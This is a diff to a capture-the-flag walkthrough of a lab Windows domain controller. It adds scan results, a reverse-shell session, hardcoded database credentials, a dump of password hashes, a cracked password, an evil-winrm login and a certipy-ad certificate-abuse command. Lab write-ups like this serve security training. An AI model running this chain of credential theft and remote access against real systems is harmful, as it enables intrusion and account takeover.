@@ -25,6 +25,7 @@ PORT      STATE SERVICE
 636/tcp   open  ldapssl
 3268/tcp  open  globalcatLDAP
 3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
 9389/tcp  open  adws
 49691/tcp open  unknown
 49692/tcp open  unknown
@@ -38,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
 Script and version scan on open ports:
 
 ```console
-root@kali:~# nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49691,49692,49693,49709,49715 -sCV 10.10.11.71
+root@kali:~# nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49691,49692,49693,49709,49715 -sCV 10.10.11.71
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 20:18 +08
 Nmap scan report for 10.10.11.71
 Host is up (0.0050s latency).
@@ -78,6 +79,9 @@ PORT      STATE SERVICE       VERSION
 | Not valid before: 2024-11-04T03:14:54
 |_Not valid after:  2025-11-04T03:14:54
 |_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
 9389/tcp  open  mc-nmf        .NET Message Framing
 49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 49692/tcp open  msrpc         Microsoft Windows RPC
@@ -195,6 +199,11 @@ listening on [any] 4444 ...
 connect to [10.10.14.6] from (UNKNOWN) [10.10.11.71] 61383
 whoami
 certificate\xamppuser
+```
+
+The reverse shell is connected at the upload directory:
+
+```cmd
 dir
  Volume in drive C has no label.
  Volume Serial Number is 7E12-22F9
@@ -208,7 +217,33 @@ dir
                2 Dir(s)   4,372,664,320 bytes free
 ```
 
+List users on the system:
+
+```cmd
+dir C:\Users
+ Volume in drive C has no label.
+ Volume Serial Number is 7E12-22F9
+
+ Directory of C:\Users
+
+12/29/2024  06:30 PM    <DIR>          .
+12/29/2024  06:30 PM    <DIR>          ..
+12/30/2024  09:33 PM    <DIR>          Administrator
+11/23/2024  07:59 PM    <DIR>          akeder.kh
+11/04/2024  01:55 AM    <DIR>          Lion.SK
+11/03/2024  02:05 AM    <DIR>          Public
+11/03/2024  08:26 PM    <DIR>          Ryan.K
+11/26/2024  05:12 PM    <DIR>          Sara.B
+12/29/2024  06:30 PM    <DIR>          xamppuser
+               0 File(s)              0 bytes
+               9 Dir(s)   4,347,604,992 bytes free
+```
+
 ## 3. Exploring the database
+
+### 3.1. Database credentials embedded in php code
+
+The database connection code is found at the web root folder:
 
 ```cmd
 dir C:\xampp\htdocs\certificate.htb\
@@ -240,6 +275,8 @@ dir C:\xampp\htdocs\certificate.htb\
                3 Dir(s)   4,372,664,320 bytes free
 ```
 
+The database credentials is embedded in the php code:
+
 ```cmd
 type C:\xampp\htdocs\certificate.htb\db.php
 ```
@@ -262,11 +299,123 @@ try {
 ?>
 ```
 
+### 3.2. User credentials in database
+
+Since there was no mysql ports discovered from the nmap scan, let's see if there's a `mysql.exe` to connect the database locally:
+
+```cmd
+dir /S C:\*mysql.exe
+ Volume in drive C has no label.
+ Volume Serial Number is 7E12-22F9
+
+ Directory of C:\xampp\mysql\bin
+
+10/30/2023  05:58 AM         3,784,616 mysql.exe
+               1 File(s)      3,784,616 bytes
+
+     Total Files Listed:
+               1 File(s)      3,784,616 bytes
+               0 Dir(s)   4,347,600,896 bytes free
+```
+
+Connect to the database, the `users` table looks interesting:
+
+```cmd
+C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "show databases;"
+Database
+certificate_webapp_db
+information_schema
+test
+C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; show tables;"
+Tables_in_certificate_webapp_db
+course_sessions
+courses
+users
+users_courses
+```
+
+There are several users in the table, with `admin` user `sara.b` matching the users found on the `C:\Users` folder:
+
+```cmd
+C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;"
+id      first_name      last_name       username        email   password        created_at      role    is_active
+1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
+6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
+7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
+8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
+9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
+10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
+12      Test    Test    test    test@example.com        $2y$04$YxYfg/64Wt1tX9WDNAjq4ukIyEk7O.58GiB782f3ilkksmSZzon4i    2025-08-30 00:50:44     student 1
+```
+
+Password hash cracked with `john`:
+
+```console
+root@kali:~# echo '$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6' > hash.txt
+
+root@kali:~# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 16 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Blink182         (?)
+1g 0:00:00:00 DONE (2025-08-31 07:47) 2.040g/s 24979p/s 24979c/s 24979C/s monday1..vallejo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+Recall that `5985` was discovered from the nmap scan, let's use `evil-winrm` with the discovered credentials to connect
+- username: `Sara.B`
+- password: `Blink182`
+
+```console
+root@kali:~# evil-winrm -i 10.10.11.71 -u Sara.B -p Blink182
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Sara.B\Documents> whoami
+certificate\sara.b
+```
+
+## 4. Lateral movement
+
+```pwsh
+*Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-ChildItem -Recurse
+
+
+    Directory: C:\Users\Sara.B\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        11/4/2024  12:53 AM                WS-01
+
+
+    Directory: C:\Users\Sara.B\Documents\WS-01
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        11/4/2024  12:44 AM            530 Description.txt
+-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
+```
+
+```pwsh
+*Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-Content WS-01\Description.txt
+The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
+When a user tries to input bad credentials, it returns bad credentials error.
+But when a user provides valid credentials the file explorer freezes and then crashes!
+```
+
 ## to be updated
 
 ```sh
-evil-winrm -i 10.10.11.71 -u Sara.B -p Blink182
-
 evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
 
 certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template Delegated-CRA
